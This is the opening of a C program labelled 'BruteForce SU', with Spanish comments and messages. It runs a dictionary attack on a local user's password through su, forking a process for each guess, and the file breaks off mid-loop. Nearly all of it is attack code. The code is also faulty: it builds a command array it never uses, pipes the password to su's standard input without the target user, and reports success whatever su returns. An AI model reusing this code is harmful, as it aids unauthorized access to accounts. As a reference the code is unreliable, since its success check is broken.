#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>

void mostrarAyuda() {
    printf("Uso: %s USUARIO DICCIONARIO [-t|--threads NUMERO]\n", program_invocation_name);
    printf("Se deben especificar tanto el nombre de usuario como el archivo de diccionario.\n");
    exit(1);
}

void imprimirBanner() {
    printf("\033[1;34m\n");
    printf("******************************\n");
    printf("*     BruteForce SU         *\n");
    printf("******************************\n");
    printf("\033[0m\n");
}

void finalizar(int signal) {
    printf("\033[1;31m\nFinalizando el script\033[0m\n");
    exit(0);
}

void probarContraseña(char *password, char *usuario) {
    pid_t child_pid = fork();

    if (child_pid == 0) { // Proceso hijo
        char *command[] = {"su", usuario, "-c", "echo Hello", NULL};
        char *password_input = strdup(password);

        if (password_input == NULL) {
            perror("Error duplicando la cadena de contraseña");
            exit(1);
        }

        FILE *pipe = popen("su", "w");

        if (pipe == NULL) {
            perror("Error abriendo el pipe");
            exit(1);
        }

        fprintf(pipe, "%s\n", password_input);
        fclose(pipe);
        free(password_input);

        exit(0);
    } else if (child_pid > 0) { // Proceso padre
        int status;
        waitpid(child_pid, &status, 0);

        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            printf("\033[1;32mContraseña encontrada para el usuario %s: %s\033[0m\n", usuario, password);
            killpg(getpid(), SIGKILL); // Matar todos los procesos en el grupo de procesos
        }
    } else {
        perror("Error creando el proceso hijo");
        exit(1);
    }
}

void ataqueConForks(char *diccionario, char *usuario, int numThreads) {
    FILE *file = fopen(diccionario, "r");

    if (file == NULL) {
        perror("Error abriendo el archivo");
        exit(1);
    }

    char *line = NULL;
    size_t len = 0;
    ssize_t read;

    while ((read = getline(&line, &len, file)) != -1) {
        line[strcspn(line, "\n")] = 0; // Eliminar el salto de línea al final

       
